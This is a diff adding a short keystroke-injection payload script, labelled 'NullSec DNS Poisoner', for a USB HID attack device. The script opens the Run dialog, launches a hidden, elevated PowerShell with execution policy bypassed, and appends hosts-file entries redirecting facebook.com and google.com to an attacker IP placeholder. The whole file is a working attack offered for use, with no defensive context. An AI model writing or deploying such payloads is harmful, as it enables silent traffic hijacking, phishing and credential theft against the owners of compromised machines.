@@ -1,0 +1,8 @@
+REM NullSec DNS Poisoner
+REM Modifies hosts file
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -ExecutionPolicy Bypass -Command "Start-Process powershell -Verb RunAs -ArgumentList '-w hidden -c `"Add-Content C:\Windows\System32\drivers\etc\hosts \`\"ATTACKER_IP facebook.com\`\"; Add-Content C:\Windows\System32\drivers\etc\hosts \`\"ATTACKER_IP google.com\`\"`"'"
+ENTER
